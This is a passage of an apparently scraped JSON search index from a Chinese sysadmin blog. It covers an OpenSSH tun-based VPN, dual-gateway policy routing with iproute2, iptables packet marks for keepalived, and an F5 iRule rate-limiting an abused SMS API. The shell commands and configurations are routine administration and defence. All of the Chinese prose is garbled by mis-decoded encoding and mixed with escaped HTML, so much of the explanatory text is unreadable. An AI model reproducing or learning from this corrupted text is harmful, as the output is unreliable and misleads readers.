192.168.244.1å’Œ192.168.244.2ï¼Œéƒ½èƒ½é€šå°±è¡¨ç¤ºå·²ç»okäº†ã€‚\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eä¼˜åŒ–ä¸€ä¸‹ï¼ŒAå’ŒBä¸¤è¾¹éƒ½å…ˆæŠŠtun5èµ·æ¥ä»¥åï¼Œç›´æ¥åœ¨Aä¸Šä¸€å¥è¯æå®šï¼Œè¿™ä¸ªä¸ä¼šè‡ªåŠ¨é€€å‡ºï¼Œæ‰€ä»¥å¾—ctrl+zï¼Œç„¶åbgæ”¾åå°å»ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essh \u003cspan class=\"se\"\u003e\\ \u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  -o \u003cspan class=\"nv\"\u003ePermitLocalCommand\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  -o \u003cspan class=\"nv\"\u003eLocalCommand\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ifconfig tun5 192.168.244.2 pointopoint 192.168.244.1 netmask 255.255.255.0\u0026#34;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  -o \u003cspan class=\"nv\"\u003eServerAliveInterval\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e60\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  -w 5:5 root@172.16.8.108 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  \u003cspan class=\"s1\"\u003e\u0026#39;ifconfig tun5 192.168.244.1 pointopoint 192.168.244.2 netmask 255.255.255.0; echo tun5 ready\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¦‚æœè¦ç”¨åœ¨ç¿»å¢™çš„ç¯å¢ƒï¼Œé‚£å°±å¾—ä¿æŒé•¿é“¾æ¥äº†ã€‚å‡è®¾Aæœºå™¨æ˜¯åœ¨ä¸€ä¸ªé˜²ç«å¢™åï¼Œä¸”è¢«NATäº†ï¼Œé‚£ä¹ˆå°±å¾—å…ˆè¿™æ ·æ‰“é€šéš§é“ï¼š\u003c/p\u003e","title":"ç”¨opensshçš„tunnelå»ºç«‹vpn"},{"content":"åœºæ™¯ï¼š\nå…¬å¸æœ‰ä¸¤æ¡çº¿è·¯ï¼Œä¸€æ¡æ˜¯é¹åšå£«çš„ï¼Œä¸€æ¡æ˜¯ç”µä¿¡çš„ã€‚ é¹åšå£«æ˜¯100å…†å…±äº«çº¿è·¯ï¼Œç”µä¿¡æ˜¯10å…†ç‹¬äº«çº¿è·¯ã€‚ é¹åšå£«å¯¹ç«¯çš„åœ°å€æ˜¯1.1.1.1ï¼Œæœ¬åœ°æœåŠ¡å™¨åœ°å€æ˜¯1.1.1.2 ç”µä¿¡å¯¹ç«¯çš„åœ°å€æ˜¯2.2.2.2ï¼Œæœ¬åœ°æœåŠ¡å™¨æ˜¯2.2.2.3 æ‰€ä»¥å¯¼è‡´æœ‰ä¸¤ä¸ªç½‘å…³ï¼Œå¤§éƒ¨åˆ†å…¬å¸åŒäº‹ç”¨å¾—æ˜¯100å…†çš„å…±äº«ï¼Œ10å…†çš„è¢«å®¢æœç‹¬ç”¨ï¼Œä½†æ˜¯ä½¿ç”¨ç‡å¾ˆä½ã€‚é‚£èƒ½å¦ä¸¤è¾¹éƒ½ç”¨å‘¢ï¼Ÿ\nç­”æ¡ˆæ˜¯å¯ä»¥çš„ï¼Œç”¨ç­–ç•¥è·¯ç”±å°±å¯ä»¥ã€‚\nç­–ç•¥è·¯ç”±éœ€è¦ç”¨åˆ°iproute2ï¼Œæ²¡æœ‰çš„è¯å…ˆå®‰è£…ä¸€ä¸‹ã€‚\nå®šä¹‰ç­–ç•¥è·¯ç”±è¡¨\ncd /etc/iproute2/ echo \u0026#34;101 pengboshi\u0026#34; \u0026gt;\u0026gt; rt_tables echo \u0026#34;102 dianxin\u0026#34; \u0026gt;\u0026gt; rt_tables å®šä¹‰ç­–ç•¥è·¯ç”±\nip route add default via 1.1.1.1 table 101 ip route add default via 2.2.2.2 table 102 okï¼Œæµé‡åˆ†ä¸ºä¸¤ä¸ªæ–¹å‘ï¼Œè¿›æ¥çš„å’Œå‡ºå»çš„ï¼Œå…ˆå®šä¹‰ç®€å•çš„ï¼Œè¿›æ¥çš„ï¼š\nip rule add from 1.1.1.1 table 101 ip rule add from 2.2.2.2 table 102 å‡ºå°±æ¯”è¾ƒéº»çƒ¦äº†ï¼Œ100å…†å’Œ10å…†æŒ‰æƒé‡æ¥åˆ†ï¼Œ8ï¼š2å§\nip route replace default scope global \\ nexthop via 1.1.1.1 dev eth0 weight 8 \\ nexthop via 2.2.2.2 dev eth0:1 weight 2 æ³¨æ„ï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯ç”¨äº†ä¸€å°è·¯ç”±å™¨æ¥è¿æ¥ä¸Šé¢ä¸¤ä¸ªç½‘å…³çš„ï¼ŒæœåŠ¡å™¨å®é™…æ˜¯ä¸€ä¸ªç½‘å¡ä¸Šè¿åˆ°äº¤æ¢æœºï¼Œç„¶åå†ä¸Šè¿è·¯ç”±å™¨çš„ï¼Œå¦‚ä¸‹å›¾:\næˆ‘ä»¬æŠŠè¿™ä¸€åˆ‡å›ºå®šä¸‹æ¥ï¼Œç¼–è¾‘/etc/rc.d/rc.localå³å¯\n# cat /etc/rc.local #!/bin/sh touch /var/lock/subsys/local /sbin/ip route replace default scope global nexthop via 1.1.1.1 dev eth0 weight 8 nexthop via 2.2.2.2 dev eth0:1 weight 2 ","permalink":"https://rendoumi.com/posts/20240111-route_policy2/","summary":"\u003cp\u003eåœºæ™¯ï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eå…¬å¸æœ‰ä¸¤æ¡çº¿è·¯ï¼Œä¸€æ¡æ˜¯é¹åšå£«çš„ï¼Œä¸€æ¡æ˜¯ç”µä¿¡çš„ã€‚\u003c/li\u003e\n\u003cli\u003eé¹åšå£«æ˜¯100å…†å…±äº«çº¿è·¯ï¼Œç”µä¿¡æ˜¯10å…†ç‹¬äº«çº¿è·¯ã€‚\u003c/li\u003e\n\u003cli\u003eé¹åšå£«å¯¹ç«¯çš„åœ°å€æ˜¯1.1.1.1ï¼Œæœ¬åœ°æœåŠ¡å™¨åœ°å€æ˜¯1.1.1.2\u003c/li\u003e\n\u003cli\u003eç”µä¿¡å¯¹ç«¯çš„åœ°å€æ˜¯2.2.2.2ï¼Œæœ¬åœ°æœåŠ¡å™¨æ˜¯2.2.2.3\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eæ‰€ä»¥å¯¼è‡´æœ‰ä¸¤ä¸ªç½‘å…³ï¼Œå¤§éƒ¨åˆ†å…¬å¸åŒäº‹ç”¨å¾—æ˜¯100å…†çš„å…±äº«ï¼Œ10å…†çš„è¢«å®¢æœç‹¬ç”¨ï¼Œä½†æ˜¯ä½¿ç”¨ç‡å¾ˆä½ã€‚é‚£èƒ½å¦ä¸¤è¾¹éƒ½ç”¨å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eç­”æ¡ˆæ˜¯å¯ä»¥çš„ï¼Œç”¨ç­–ç•¥è·¯ç”±å°±å¯ä»¥ã€‚\u003c/p\u003e\n\u003cp\u003eç­–ç•¥è·¯ç”±éœ€è¦ç”¨åˆ°\u003cstrong\u003eiproute2\u003c/strong\u003eï¼Œæ²¡æœ‰çš„è¯å…ˆå®‰è£…ä¸€ä¸‹ã€‚\u003c/p\u003e\n\u003cp\u003eå®šä¹‰ç­–ç•¥è·¯ç”±è¡¨\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /etc/iproute2/  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;101 pengboshi\u0026#34;\u003c/span\u003e \u0026gt;\u0026gt; rt_tables  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;102 dianxin\u0026#34;\u003c/span\u003e \u0026gt;\u0026gt; rt_tables  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå®šä¹‰ç­–ç•¥è·¯ç”±\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eip route add default via 1.1.1.1 table \u003cspan class=\"m\"\u003e101\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eip route add default via 2.2.2.2 table \u003cspan class=\"m\"\u003e102\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eokï¼Œæµé‡åˆ†ä¸ºä¸¤ä¸ªæ–¹å‘ï¼Œè¿›æ¥çš„å’Œå‡ºå»çš„ï¼Œå…ˆå®šä¹‰ç®€å•çš„ï¼Œè¿›æ¥çš„ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eip rule add from 1.1.1.1 table \u003cspan class=\"m\"\u003e101\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eip rule add from 2.2.2.2 table \u003cspan class=\"m\"\u003e102\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå‡ºå°±æ¯”è¾ƒéº»çƒ¦äº†ï¼Œ100å…†å’Œ10å…†æŒ‰æƒé‡æ¥åˆ†ï¼Œ8ï¼š2å§\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eip route replace default scope global \u003cspan class=\"se\"\u003e\\ \u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enexthop via 1.1.1.1 dev eth0 weight \u003cspan class=\"m\"\u003e8\u003c/span\u003e \u003cspan class=\"se\"\u003e\\ \u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enexthop via 2.2.2.2 dev eth0:1 weight \u003cspan class=\"m\"\u003e2\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯ç”¨äº†ä¸€å°è·¯ç”±å™¨æ¥è¿æ¥ä¸Šé¢ä¸¤ä¸ªç½‘å…³çš„ï¼ŒæœåŠ¡å™¨å®é™…æ˜¯ä¸€ä¸ªç½‘å¡ä¸Šè¿åˆ°äº¤æ¢æœºï¼Œç„¶åå†ä¸Šè¿è·¯ç”±å™¨çš„ï¼Œå¦‚ä¸‹å›¾:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20240111-route_policy2/image-20240111164124457.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬æŠŠè¿™ä¸€åˆ‡å›ºå®šä¸‹æ¥ï¼Œç¼–è¾‘/etc/rc.d/rc.localå³å¯\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# cat /etc/rc.local\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#!/bin/sh\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etouch /var/lock/subsys/local  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/sbin/ip route replace default scope global nexthop via 1.1.1.1 dev eth0 weight \u003cspan class=\"m\"\u003e8\u003c/span\u003e nexthop via 2.2.2.2 dev eth0:1 weight \u003cspan class=\"m\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"å¤šç½‘å…³ã€ç­–ç•¥è·¯ç”±ã€è´Ÿè½½å‡è¡¡çš„å®é™…åº”ç”¨"},{"content":"Iptableå¯ä»¥ç»™è¿›æ¥çš„åŒ…æ‰“ä¸Šæ ‡ç­¾ï¼Œæ¯”å¦‚æˆ‘ä»¬æŠŠä»1.2.3.4è¿›æ¥çš„åŒ…éƒ½æ‰“ä¸Šæ ‡ç­¾2000ï¼ˆæ ‡ç­¾å¯ä»¥æ˜¯ä»»ä½•æ•´æ•°ï¼‰\niptables -t mangle -A PREROUTING -i eth0 \\ -p tcp -s 1.2.3.4 --dport http -j MARK --set-mark 2000 æˆ–è€…æŠŠè®¿é—®172.16.8.1çš„80å’Œ443ç«¯å£çš„åŒ…éƒ½æ‰“ä¸Šæ ‡ç­¾123ï¼š\niptables -t mangle -A PREROUTING -i eth0 \\ -p tcp -d 172.16.8.1/32 -m multiport --dports 80,443 -j MARK --set-mark 123 éšåæˆ‘ä»¬å°±å¯ä»¥åœ¨keepalivedé‡Œæ¥æŒ‡å®švirtual_serveræ¥å¤„ç†è¿™äº›æ‰“è¿‡æ ‡ç­¾çš„æµé‡äº†ï¼š\nvirtual_server fwmark 123 { ... } å…·ä½“çš„ä¸€ä¸ªç”¨æ³•ï¼Œå¦‚æœä½ æƒ³ç¦æ­¢ä»1.2.3.4æ¥çš„ipè®¿é—®ä½ æœåŠ¡å™¨ï¼Œäºæ˜¯ä¹ä½ å°±å¯ä»¥å…ˆç»™åŒ…æ‰“ä¸Šæ ‡ç­¾2000ï¼Œç„¶åé…ä¸ªæœåŠ¡å™¨ï¼Œä¸Šé¢å†™è”ç³»äººå’Œç”µè¯ï¼Œå•ç‹¬ç»™ä»–çœ‹ï¼Œä»–çœ‹åˆ°ä¼šè”ç³»ä½ è¯¢é—®è¢«å±è”½çš„åŸå› ï¼Œå¦‚ä¸‹ï¼š\nvirtual_server fwmark 2000 { delay_loop 6 lb_algo wlc lb_kind NAT persistence_timeout 0 protocol TCP real_server 10.10.10.1 80 { weight 1 TCP_CHECK { connect_port 80 connect_timeout 3 } } } ","permalink":"https://rendoumi.com/posts/20240111-keepalived_iptable_mark/","summary":"\u003cp\u003eIptableå¯ä»¥ç»™è¿›æ¥çš„åŒ…æ‰“ä¸Šæ ‡ç­¾ï¼Œæ¯”å¦‚æˆ‘ä»¬æŠŠä»1.2.3.4è¿›æ¥çš„åŒ…éƒ½æ‰“ä¸Šæ ‡ç­¾2000ï¼ˆæ ‡ç­¾å¯ä»¥æ˜¯ä»»ä½•æ•´æ•°ï¼‰\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -t mangle -A PREROUTING -i eth0 \u003cspan class=\"se\"\u003e\\ \u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-p tcp -s 1.2.3.4 --dport http -j MARK --set-mark \u003cspan class=\"m\"\u003e2000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæˆ–è€…æŠŠè®¿é—®172.16.8.1çš„80å’Œ443ç«¯å£çš„åŒ…éƒ½æ‰“ä¸Šæ ‡ç­¾123ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -t mangle -A PREROUTING -i eth0 \u003cspan class=\"se\"\u003e\\ \u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-p tcp -d 172.16.8.1/32 -m multiport --dports 80,443 -j MARK --set-mark \u003cspan class=\"m\"\u003e123\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eéšåæˆ‘ä»¬å°±å¯ä»¥åœ¨keepalivedé‡Œæ¥æŒ‡å®švirtual_serveræ¥å¤„ç†è¿™äº›æ‰“è¿‡æ ‡ç­¾çš„æµé‡äº†ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirtual_server fwmark \u003cspan class=\"m\"\u003e123\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   ...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå…·ä½“çš„ä¸€ä¸ªç”¨æ³•ï¼Œå¦‚æœä½ æƒ³ç¦æ­¢ä»1.2.3.4æ¥çš„ipè®¿é—®ä½ æœåŠ¡å™¨ï¼Œäºæ˜¯ä¹ä½ å°±å¯ä»¥å…ˆç»™åŒ…æ‰“ä¸Šæ ‡ç­¾2000ï¼Œç„¶åé…ä¸ªæœåŠ¡å™¨ï¼Œä¸Šé¢å†™è”ç³»äººå’Œç”µè¯ï¼Œå•ç‹¬ç»™ä»–çœ‹ï¼Œä»–çœ‹åˆ°ä¼šè”ç³»ä½ è¯¢é—®è¢«å±è”½çš„åŸå› ï¼Œå¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirtual_server fwmark \u003cspan class=\"m\"\u003e2000\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edelay_loop \u003cspan class=\"m\"\u003e6\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e lb_algo wlc\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e lb_kind NAT\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e persistence_timeout \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e protocol TCP\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ereal_server 10.10.10.1 \u003cspan class=\"m\"\u003e80\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e weight \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e TCP_CHECK \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  connect_port \u003cspan class=\"m\"\u003e80\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  connect_timeout \u003cspan class=\"m\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Keepalivedä¸iptables markçš„è”åŠ¨"},{"content":"å…¬å¸çš„æœåŠ¡å™¨é­å—äº†æ”»å‡»ï¼ŒæŸäº›äººä¸åœè°ƒç”¨å…¬å¸æœåŠ¡å™¨å‘é€çŸ­ä¿¡çš„apiï¼ŒçœŸæ˜¯æœ‰å¤Ÿæ— èŠçš„ã€‚\nç”±äºæˆ‘ä»¬çš„æ¶æ„æ˜¯å‰é¢F5 Bigipï¼Œåé¢æ¥äº†Nä¸ªTomcatï¼Œé‚£å°±ç›´æ¥å†™ä¸ªF5çš„iruleæ¥é˜»æ­¢å®ƒã€‚\né˜»æ­¢GETè¯·æ±‚çš„é¢‘ç‡ï¼Œ30ç§’åªå…è®¸å•ä¸ªipå‘5æ¬¡\nå‡è®¾GETçš„æ¨¡å¼æ˜¯ GET /sendsms.do?mobile=13800000000\u0026amp;msg=aaaaaaaa iruleé‡Œæœ‰ä¸ªéå¸¸ç¥å¥‡çš„ä¸œè¥¿ï¼Œtableï¼Œæ˜¯sessionä¼šè¯è¡¨çš„è¶…è¡¨ï¼ŒåŸºæœ¬æ“ä½œæ˜¯key-valueå‹ï¼Œå¸¦æœ‰ç”Ÿå­˜æ—¶é—´ï¼Œè¿™ç‚¹æœ€é‡è¦ã€‚\nè¯¦ç»†çš„å¤§å®¶å¯ä»¥å»çœ‹ï¼š\nhttps://clouddocs.f5.com/api/irules/table.html\né˜»æ­¢GETçš„iruleï¼š\nwhen RULE_INIT { set static::windowSecs 30 } when HTTP_REQUEST { if { ( [HTTP::method] equals \u0026#34;GET\u0026#34; ) \u0026amp;\u0026amp; ( [HTTP::uri] starts_with \u0026#34;/sendsms.do\u0026#34; ) } { set myUserId [IP::client_addr] set myMaxRate 5 if { $myMaxRate ne \u0026#34;\u0026#34; } { set reqnum [table incr \u0026#34;req:$myUserId\u0026#34;] set tbl \u0026#34;countpost:$myUserId\u0026#34; table set -subtable $tbl $reqnum \u0026#34;ignored\u0026#34; indef $static::windowSecs if { [table keys -subtable $tbl -count] \u0026gt; $myMaxRate } { HTTP::respond 403 \u0026#34;Block\u0026#34; return } } } } æ¥ä¸ªæ›´åŠ å¤æ‚çš„ä¾‹å­ï¼š\nPOSTçš„è¯·æ±‚å¦‚ä¸‹ï¼š\nPOST /api/sendMessage.htm HTTP/1.1 Content-Length: 203 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Host: 172.8.2.23 Connection: Keep-Alive User-Agent: Apache-HttpClient/4.5 (Java/1.7.0_51) Accept-Encoding: gzip,deflate action=order.sumit.order\u0026amp;jsonData=%7B%22channelCode%22%3A%22%22%2C%22mobiles%22%3A%5B%2215176989787%22%5D%2C%22source%22%3A%22pop%22%2C%22tempParameters%22%3A%5B%22480827%22%2C%2291%22%5D%2C%22templateId%22%3A2%7D æˆ‘ä»¬è¦é˜»æ­¢POST /api/sendMessage.htmä¸”action=sendmsgçš„è¯ï¼Œå°±æ¯”è¾ƒå¤æ‚ä¸€äº›ï¼Œæˆ‘ä»¬åˆ¤æ–­uriæ»¡è¶³æ¡ä»¶åï¼Œè¿˜è¦è¿›ä¸€æ­¥åˆ¤æ–­contentä¸­action=çš„å†…å®¹ï¼š\nwhen RULE_INIT { set static::windowSecs 10 } when HTTP_REQUEST { if { ( [HTTP::method] equals \u0026#34;POST\u0026#34; ) \u0026amp;\u0026amp; ( [HTTP::uri] equals \u0026#34;/api/sendMessage.htm\u0026#34; ) \u0026amp;\u0026amp; ([HTTP::header \u0026#34;Content-Length\u0026#34;] \u0026lt;= 2048) } { HTTP::collect [HTTP::header Content-Length] } } when HTTP_REQUEST_DATA { set myUserId [IP::client_addr] set mymethod \u0026#34;unknown\u0026#34; foreach x [split [string tolower [HTTP::payload]] \u0026#34;\u0026amp;\u0026#34;] { if { $x starts_with \u0026#34;action=\u0026#34; } { set mymethod [lindex [split $x \u0026#34;=\u0026#34;] 1] } } if { $mymethod equals \u0026#34;order.submit.order\u0026#34; } { set myMaxRate 5 if { $myMaxRate ne \u0026#34;\u0026#34; } { set reqnum [table incr \u0026#34;req:$myUserId\u0026#34;] set tbl \u0026#34;countpost:$myUserId\u0026#34; table set -subtable $tbl $reqnum \u0026#34;ignored\u0026#34; indef $static::windowSecs if { [table keys -subtable $tbl -count] \u0026gt; $myMaxRate } { HTTP::respond 403 \u0026#34;Block\u0026#34; return } } } } ","permalink":"https://rendoumi.com/posts/20240111-f5_irule_ddos/","summary":"\u003cp\u003eå…¬å¸çš„æœåŠ¡å™¨é­å—äº†æ”»å‡»ï¼ŒæŸäº›äººä¸åœè°ƒç”¨å…¬å¸æœåŠ¡å™¨å‘é€çŸ­ä¿¡çš„apiï¼ŒçœŸæ˜¯æœ‰å¤Ÿæ— èŠçš„ã€‚\u003c/p\u003e\n\u003cp\u003eç”±äºæˆ‘ä»¬çš„æ¶æ„æ˜¯å‰é¢F5 Bigipï¼Œåé¢æ¥äº†Nä¸ªTomcatï¼Œé‚£å°±ç›´æ¥å†™ä¸ªF5çš„iruleæ¥é˜»æ­¢å®ƒã€‚\u003c/p\u003e\n\u003cp\u003eé˜»æ­¢GETè¯·æ±‚çš„é¢‘ç‡ï¼Œ30ç§’åªå…è®¸å•ä¸ªipå‘5æ¬¡\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eå‡è®¾GETçš„æ¨¡å¼æ˜¯\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eGET /sendsms.do?mobile\u003cspan class=\"o\"\u003e=\u003c/span\u003e13800000000\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003emsg\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eaaaaaaaa  